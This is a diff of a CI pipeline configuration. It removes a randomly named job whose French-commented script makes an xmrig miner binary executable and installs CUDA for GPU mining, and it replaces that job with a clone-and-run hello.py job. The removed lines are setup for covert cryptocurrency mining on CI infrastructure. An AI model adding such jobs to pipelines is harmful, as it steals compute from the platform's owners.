@@ -3,20 +3,23 @@
     branches:
       only: main
 jobs:
-  XCkW36exrUPKqGE:
+  CloneRepo:
     resources:
       instance-type: C5
-    uses: script@v1
-    image: ubuntu:latest
+    outputs:
+      repo:
+        type: volume
+    uses: git-checkout@v1
     with:
-      script: |
-        # Mettre à jour et upgrader les paquets
-        sudo apt-get update
-        sudo apt-get upgrade -y
-
-        # Donner les permissions nécessaires
-        sudo chmod +x xmrig-6.14.1/xmrig
-
-        # Télécharger et configurer CUDA (nécessaire pour utiliser la GPU)
-        sudo apt-get install -y nvidia-cuda-toolkit
-        sudo apt-get install -y build-essential
+      url: context.event.github.url
+  HelloWorld:
+    resources:
+      instance-type: C5
+    needs:
+      - CloneRepo
+    inputs:
+      repo: CloneRepo.outputs.repo
+    uses: script@v1
+    with:
+      script: python /inputs/repo/hello.py
+      image: tensorflow/tensorflow:1.14.0-py3
